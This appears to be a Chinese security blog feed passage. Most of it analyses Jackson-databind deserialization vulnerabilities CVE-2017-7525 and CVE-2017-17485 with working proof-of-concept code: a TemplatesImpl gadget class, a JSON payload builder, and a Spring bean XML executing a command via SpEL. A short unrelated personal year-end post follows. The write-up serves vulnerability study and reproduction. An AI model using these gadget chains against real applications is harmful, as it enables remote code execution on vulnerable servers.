&lt;li&gt;调用了 &lt;code&gt;ObjectMapper.enableDefaultTyping()&lt;/code&gt; 函数；&lt;/li&gt;
&lt;li&gt;对要进行反序列化的类的属性使用了值为 &lt;code&gt;JsonTypeInfo.Id.CLASS&lt;/code&gt; 的 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 注解；&lt;/li&gt;
&lt;li&gt;对要进行反序列化的类的属性使用了值为 &lt;code&gt;JsonTypeInfo.Id.MINIMAL_CLASS&lt;/code&gt; 的 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 注解；
在这些情况下Jackson 反序列化会调用属性所属类的构造函数和 setter 方法，而如果调用的构造函数或 setter 方法存在危险操作，那么我们就可以说其存在 Jackson 反序列化漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;CVE-2017-7525&lt;/h3&gt;
&lt;p&gt;利用链是 TemplatesImpl 链，所以要求 JDK 版本是 7u21 或者 8u20，动态代理相关的链子，这部分之前已经分析过了，相关代码如下&lt;/p&gt;
&lt;h4&gt;环境准备&lt;/h4&gt;
&lt;p&gt;PoC.java&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PoC {  
    public static void main(String[] args) throws Exception {  
        String exp = readClassStr(&quot;D:\\SimpleCalc.class&quot;);  
        String jsonInput = aposToQuotes(&quot;{\&quot;object\&quot;:[&apos;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&apos;,\n&quot; +  
                &quot;{\n&quot; +  
                &quot;&apos;transletBytecodes&apos;:[&apos;&quot;+exp+&quot;&apos;],\n&quot; +  
                &quot;&apos;transletName&apos;:&apos;null&apos;,\n&quot; +  
                &quot;&apos;outputProperties&apos;:{}\n&quot; +  
                &quot;}\n&quot; +  
                &quot;]\n&quot; +  
                &quot;}&quot;);  
        System.out.printf(jsonInput);  
        ObjectMapper mapper = new ObjectMapper();  
        mapper.enableDefaultTyping();  
        Test test;  
        try {  
            test = mapper.readValue(jsonInput, Test.class);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
  
    public static String aposToQuotes(String json){  
        return json.replace(&quot;&apos;&quot;,&quot;\&quot;&quot;);  
    }  
  
    public static String readClassStr(String cls) throws Exception{  
  
        File file = new File(cls);  
        FileInputStream fileInputStream = new FileInputStream(file);  
        byte[] bytes = new byte[(int) file.length()];  
        fileInputStream.read(bytes);  
        String base64Encoded = DatatypeConverter.printBase64Binary(bytes);  
        return base64Encoded;  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;SimpleCalc.java&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
public class SimpleCalc extends AbstractTranslet {  
    public SimpleCalc() throws Exception {  
        Runtime.getRuntime().exec(&quot;Calc&quot;);  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Test.java&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class Test {    
    public Object object;    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220000316.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;关于Templates链的衔接，在Fastjson里面是通过任意getter调用衔接&lt;code&gt;getOutputProperties&lt;/code&gt;调用多个，而在那几条常见的CC中一般也是衔接&lt;code&gt;newTransform&lt;/code&gt;来做的调用。显然和我们前面研究的Jackson所提供的条件有所出入，我们调试排查一下。&lt;/p&gt;
&lt;h4&gt;调试分析&lt;/h4&gt;
&lt;p&gt;readValue这里把断点打一下，因为大多流程在分析Jackson反序列化特点的时候已经写过了，直接从&lt;code&gt;deserializeAnddSet&lt;/code&gt;这里接着开始。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220014813.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220015416.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;第一步的&lt;code&gt;deserializeAndSet&lt;/code&gt;是object设置成Templates对象，之后的&lt;code&gt;deserializeAndSet&lt;/code&gt;就是给Templates对象设置一下属性的事，这里专门挑了属性为&lt;code&gt;outputProperties&lt;/code&gt;的时候跟进看了一看
，不难看出相较于存在set方法的属性，这里的&lt;code&gt;deserializeAndSet&lt;/code&gt;是由&lt;code&gt;SetterlessProperty&lt;/code&gt;实现而非&lt;code&gt;MethodProperty&lt;/code&gt;实现的。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220021023.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220020830.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之后就没什么特别的东西了，和Fastjson那里调用Templatels是一样的，都是通过任意getter调用&lt;code&gt;getOutputProperties&lt;/code&gt; 实现&lt;code&gt;Templates&lt;/code&gt;链利用。&lt;/p&gt;
&lt;h4&gt;细节补充&lt;/h4&gt;
&lt;p&gt;主要就是写一下为什么这条Templates会对jdk版本有限制，毕竟从头到尾看下来好像没发现jdk7相较于jdk8什么特殊的点，这里直接点名原因
jdk7
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220021735.png&quot; alt=&quot;&quot; /&gt;
jdk8
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220021857.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在新建 TransletClassLoader 类实例的代码，jdk8调用了其中的 &lt;code&gt;_tfactory&lt;/code&gt; 属性，而因为 &lt;code&gt;_tfactory&lt;/code&gt; 在原本的 &lt;code&gt;TemplatesImpl&lt;/code&gt; 类中都没有 getter 或 setter 方法，Jackson 也无法设置 &lt;code&gt;_tfactory&lt;/code&gt;，所以在poc中其值默认为 null，于是就会jdk8就抛出异常了。&lt;/p&gt;
&lt;p&gt;而CVE-2017-7525是怎么修复的也是比较简单粗暴，就是后续版本的jackson在创建Bean 反序列化器的时候加了个黑名单把&lt;code&gt;Templates&lt;/code&gt;给过滤掉了。&lt;/p&gt;
&lt;h3&gt;CVE-2017-17485&lt;/h3&gt;
&lt;h4&gt;环境准备&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;dependencies&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;2.7.9.1&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;jackson-core&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;jackson-annotations&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;spring-context&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;5.0.2.RELEASE&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;spring-beans&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;5.0.2.RELEASE&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;spring-core&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;5.0.2.RELEASE&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;spring-expression&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;5.0.2.RELEASE&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
  &amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;commons-logging&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;commons-logging&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;1.2&amp;lt;/version&amp;gt;  
  &amp;lt;/dependency&amp;gt;  
&amp;lt;/dependencies&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;漏洞复现&lt;/h4&gt;
&lt;p&gt;PoC.java&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PoC {    
    public static void main(String[] args)  {    
        //CVE-2017-17485    
        String payload = &quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;;    
        ObjectMapper mapper = new ObjectMapper();    
        mapper.enableDefaultTyping();    
        try {    
            mapper.readValue(payload, Object.class);    
        } catch (IOException e) {    
            e.printStackTrace();    
        }    
    }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sepl.xml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;  
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
       xsi:schemaLocation=&quot;  
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;  
    &amp;lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&amp;gt;  
        &amp;lt;constructor-arg value=&quot;calc&quot; /&amp;gt;  
        &amp;lt;property name=&quot;whatever&quot; value=&quot;#{ pb.start() }&quot;/&amp;gt;  
    &amp;lt;/bean&amp;gt;  
&amp;lt;/beans&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果如下图所示,spel.xml是挂到了python起的服务器上&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220134109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;漏洞分析&lt;/h4&gt;
&lt;p&gt;就像之前提到的那样，在反序列化的过程中会调用默认的构造函数，我们前面的步骤直接省略跳过，从构造函数这里开始分析，跟一步重载，来到关键的&lt;code&gt;refreshe()&lt;/code&gt;这里，跟进去分析。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220154642.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220154829.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;refreshe()&lt;/code&gt;这个方法是 Spring Bean 加载的核心，它是 &lt;code&gt;ClassPathXmlApplicationContext &lt;/code&gt;的父类 &lt;code&gt;AbstractApplicationContext&lt;/code&gt; 的一个方法 ， 用于刷新整个Spring 上下文信息，定义了整个 Spring 上下文加载的流程。着重关注&lt;code&gt;obtainFreshBeanFactory&lt;/code&gt;这块，这里的&lt;code&gt;beanFactory&lt;/code&gt;和xml解析加载成对象显然是息息相关的。此方法会解析配置文件并将bean信息存储到beanDefinition中，注册到BeanFactory（但是未被初始化，仅将信息写到了beanDefination的map中）下面的操作都基于这个beanFactory进行，我们跟进去看看它是怎么解析xml的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220155043.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进&lt;code&gt;this.refreshBeanFactory();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220155456.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;先检查当前的上下文环境是否已经由了&lt;code&gt;BeanFactory&lt;/code&gt;，如果的确存在就先把其中管理的bean全都销毁再关闭当前&lt;code&gt;beanFactory&lt;/code&gt;，之后再建立一个新的&lt;code&gt;BeanFactory&lt;/code&gt;重新配置，这里着重看看50行，光从名字就知道这里肯定和&lt;code&gt;bean&lt;/code&gt;加载有关系，浅跟一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220155727.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在32-35行建立设置了一个xml加载器，并且把&lt;code&gt;beanFactory&lt;/code&gt;绑定在上面，最后利用37行的重载调用这个xml加载器进行加载，我们跟进看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220160254.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;如果当前存在设置好的Resource对象，就有限把Resource传给&lt;code&gt;xmlreader&lt;/code&gt;利用Resource的自有属性进行bean加载，如果并不存在相应的Resource对象，则尝试读取&lt;code&gt;configLocation&lt;/code&gt;，到指定位置进行bean加载。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220161418.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;遍历locations数组得到当前location进行加载，这里仔细跟的话又是好几步重载，简单来看的话就是把location封装成了resoure对象，然后调用Resource的那个loadBeanDefinitions来加载，和上面属于是殊途同归了。在最后一步重载上不用分析的代码有点多，影响截图了，这里直接贴精选版的代码来分析，此处批注是别的师傅写的，写的挺清晰，这里就先拿过来用了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240220162127.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public int loadBeanDefinitions(EncodedResource encodedResource) throws BeanDefinitionStoreException {  
	try {  
		//获取Resource对象中的xml文件流对象,在这一段上实现了远程访问  
		InputStream inputStream = encodedResource.getResource().getInputStream();  
		try {  
			//InputSource是jdk中的sax xml文件解析对象  
			InputSource inputSource = new InputSource(inputStream);  
			if (encodedResource.getEncoding() != null) {  
				inputSource.setEncoding(encodedResource.getEncoding());  
			}  
			//主要看这个方法  
			return doLoadBeanDefinitions(inputSource, encodedResource.getResource());  
		}  
		finally {  
			inputStream.close();  
		}  
	}  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟进一下&lt;code&gt;doLoadBeanDefinitions&lt;/code&gt;，这里如果是用idea反编译做调试的话就会没法跟进方法，需要自己搭建一个带jackson的spring环境。390行这块把inputSource 封装成Document文件对象，在之后的391行再根据解析出来的document对象，拿到里面的标签元素，将其封装成BeanDefinition，跟进一下391行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221151829.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这段代码是用来从一个XML文档中读取和注册Bean定义的。它的参数是一个Document对象，表示XML文档，和一个Resource对象，表示文档的来源。它的返回值是注册的Bean定义的数量。它的具体步骤如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个BeanDefinitionDocumentReader对象，用来解析XML文档中的Bean定义。默认的实现类是DefaultBeanDefinitionDocumentReader。&lt;/li&gt;
&lt;li&gt;获取Bean定义的注册中心，也就是BeanFactory的实现类，比如DefaultListableBeanFactory。记录下注册前的Bean定义的数量。&lt;/li&gt;
&lt;li&gt;调用documentReader的registerBeanDefinitions方法，传入Document对象和一个XmlReaderContext对象。这个方法会遍历XML文档的根元素和子元素，根据不同的命名空间和标签，使用NamespaceHandler 和BeanDefinitionParser来解析Bean定义，并将其注册到注册中心中。&lt;/li&gt;
&lt;li&gt;返回注册后的Bean定义的数量减去注册前的数量，得到本次注册的Bean定义的数量。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比较重要的部分在第507行，就是在这里解析的bean。我们先跟进去看看&lt;code&gt;createReaderContext&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221152640.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;直接贴代码，不截图了，这里是创建了一个XmlReaderContext对象，关注一下它的几个参数然后出栈跟进&lt;code&gt;registerBeanDefinitions&lt;/code&gt;即可&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;resource&lt;/strong&gt;: 一个Resource对象，表示XML文档的来源，比如一个文件或者一个URL。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;this.problemReporter&lt;/strong&gt;: 一个ProblemReporter对象，用来报告XML解析过程中遇到的错误或者警告。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;this.eventListener&lt;/strong&gt;: 一个EventListener对象，用来监听XML解析过程中发生的事件，比如Bean定义的注册或者别名的定义。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;this.sourceExtractor&lt;/strong&gt;: 一个SourceExtractor对象，用来从XML节点中提取源信息，比如行号或者列号。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;this&lt;/strong&gt;: 一个XmlBeanDefinitionReader对象，表示当前的XML解析器。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;getNamespaceHandlerResolver()&lt;/strong&gt;: 一个NamespaceHandlerResolver对象，用来根据命名空间URI找到对应的NamespaceHandler，用来处理自定义的XML标签78。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public XmlReaderContext createReaderContext(Resource resource) {  
   return new XmlReaderContext(resource, this.problemReporter, this.eventListener,  
         this.sourceExtractor, this, getNamespaceHandlerResolver());  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221153942.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;先取出当前正在使用的代理，再调用 &lt;code&gt;createDelegate&lt;/code&gt; 方法，根据 &lt;code&gt;root&lt;/code&gt; 元素和 &lt;code&gt;parent&lt;/code&gt; 代理，创建一个新的解析代理，并赋值给 &lt;code&gt;this.delegate&lt;/code&gt;，使得可以在不同的层级使用不同的代理。这里的代理是指 &lt;code&gt;BeanDefinitionParserDelegate&lt;/code&gt; 类，它是一个辅助类，用来解析 XML 文件中的 bean 定义。因为里面的bean不止一个，所以需要多个代理。中间那一长串&lt;code&gt;if&lt;/code&gt;暂时跳过，重点关注&lt;strong&gt;preProcessXml&lt;/strong&gt;、&lt;strong&gt;parseBeanDefinitions&lt;/strong&gt;、&lt;strong&gt;postProcessXml&lt;/strong&gt;三个方法。其中 preProcessXml 和 postProcessXml 都是空方法，意思是在解析标签前后我们自己可以扩展需要执行的操作，也是一个模板方法模式，体现了 Spring 的高扩展性。然后进入 parseBeanDefinitions 方法看具体是怎么解析标签的。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221165642.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;从根节点开始遍历解析，判断当前节点是用自定义标签还是默认标签的形式解析，此处遍历到的&lt;code&gt;&amp;lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&amp;gt;  &lt;/code&gt;用的是默认标签形式，跟进175行。&lt;/p&gt;
&lt;p&gt;ps: 带前缀的就是自定义标签，否则就是 Spring 默认标签&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
http://www.springframework.org/schema/beans
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221170700.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;因为解析的标签是bean标签，这里走195行的逻辑，最终会将这些标签属性的值装入到 BeanDefinition 对象中，这里就不用跟进了，我们出栈，回到最初的起点&lt;code&gt;AbstractApplicationContext#refresh&lt;/code&gt;继续分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221171228.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到line#531这里，顺带一提我们现在已经能够看到beanFactory里面出现我们刚才搞出来的BeanDefinition了，跟进。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221172110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进line#693&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221172953.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;前面有些地方用不到，只把关键的部分贴出来，跟进这里的&lt;code&gt;beanFactory.getBeanNamesForType&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public static void invokeBeanFactoryPostProcessors(  
      ConfigurableListableBeanFactory beanFactory, List&amp;lt;BeanFactoryPostProcessor&amp;gt; beanFactoryPostProcessors) {
      List&amp;lt;BeanDefinitionRegistryPostProcessor&amp;gt; currentRegistryProcessors = new ArrayList&amp;lt;&amp;gt;();  
	// First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.  
String[] postProcessorNames =  
      beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟进&lt;code&gt;doGetBeanNamesForType&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221174515.png&quot; alt=&quot;&quot; /&gt;
此处调用 &lt;code&gt;isFactoryBean()&lt;/code&gt; 判断当前 beanName 是否为 FactoryBean，此时 beanName 参数值为 &lt;strong&gt;pb&lt;/strong&gt;，mbd 参数中识别到 bean 标签中的类为 &lt;code&gt;java.lang.ProcessBuilder&lt;/code&gt;，跟进看看
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221184249.png&quot; alt=&quot;&quot; /&gt;
调用&lt;code&gt;predictBeanType&lt;/code&gt;来拿到bean的&lt;code&gt;class&lt;/code&gt;，跟进
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221184452.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里多截几张图跟一下，大概就是一个关于targetType求而不得,层层相求的故事,直到&lt;code&gt;deResolveBeanClass&lt;/code&gt;开始对类名进行 SpEL 表达式解析求值才得以解决问题，此时className参数指向”java.lang.ProcessBuilder，我们从&lt;code&gt;1409&lt;/code&gt;开始跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221192903.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221192925.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221193036.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221193336.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;关注一下这里的 &lt;code&gt;this.beanExpressionResolver.evaluate()&lt;/code&gt;，此时&lt;code&gt;this.beanExpressionResolver&lt;/code&gt;指向的是&lt;code&gt;StandardBeanExpressionResolver&lt;/code&gt;，已经找用到了对应的SpEL表达式解析器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221193548.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221194323.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式，之后就是SPEL注入的流程了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240221194648.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到此整个漏洞就算分析完毕了，一整个就是&lt;code&gt;ClassPathXmlApplicationContext&lt;/code&gt;的构造函数引发的惨案&lt;/p&gt;
</content:encoded></item><item><title>关于2023的年度总结</title><link>https://f4miti0n.github.io/posts/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid><pubDate>Mon, 01 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;和所有终将逝去的日子一样，无论多么地难以忘怀，2023最终还是不可避免地来到了它的终点站。把玩着手里的蝴蝶刀，思考着2023是否依然迷迷糊糊、光阴虚度，是否有值得铭记的重大事件将其与浑浑噩噩的年月区分开来，却又迷茫于什么才是所谓的值得铭记与不浑浑噩噩。我们的生命被年切割，用于测量过往一个阶段的得失，但所谓的得失标准却并没有一个统一的定论，这不免是有些荒唐的。不过即便如此，却也的确还是写点东西记录一下为妙，有些节点一旦错过了，再想要回忆起当时的所知所想，可就实在太难了。&lt;/p&gt;
&lt;p&gt;像是所有烂片都会有一个或者几个固定桥段那样，近几年生活的大事件仿佛都格外偏爱于夏天这个节点，从21年的高考、22年的某app，再到今年的暑期实习，无一例外皆是如此。但区别于别人实习过后对于能力增长、阅历增长之类的阳光发言，我只想感叹，象牙塔外的世界实在困难。虽然早有预料，但真正到了需要自己解决一切问题的时候，才发现随着年龄增长的东西只有年龄，即便是自认为已经成长良多的今天，我也只不过是个21岁的巨婴罢了。具体的细节就不再谈来内耗，有兴趣的话可以看看“最近的生活”和“7月杂谈”这两篇文章。经过这次的实习事件，上大学以来所坚持的直接就业战略第一次产生了动摇。一方面，坐在格子间里当社畜的日子给我留下了些心理阴影，对于直接就业这件事情，我确实有点逃避心理、一方面，本科阶段就选择就业，对于如我这样双非且菜狗的选手而言，前景也实在谈不上乐观，即便是把剩余的时间全部拿去卷技术，我也不觉得真能结出什么好花好果出来。我几乎已经可以看到我的未来了。低薪安研(CTF课程研究)、不知名公司红队(大安服)、一些听过名字的乙方公司安服仔。每一种转职方向好像都不是那么的尽如人意，至少不像是一个准备四年就业的人的最终归宿。当然，菜是原罪，这并没有什么好抱怨的，但就和穷人始终追求性价比一样，我也想在有限的道路里选择出相对最优的那一条，即使我其实并不知道什么才是优的标准。有时候真是挺羡慕那些能守住初心的朋友，无论结果如何，至少他们的轨道是不变的，只需要顺着生活的惯性走下去就万事大吉。&lt;/p&gt;
&lt;p&gt;每次写这种回忆性质的东西情绪就会不自觉沉下去，搞得好像时刻生活在水深火热里一样。其实今年的生活总体来讲还是无喜无悲安稳落地的。为了平和一下文章的基调，这里多少也列一下今年比较开心的事儿
1. 学会了些纸牌魔术，空手出牌算是入门了
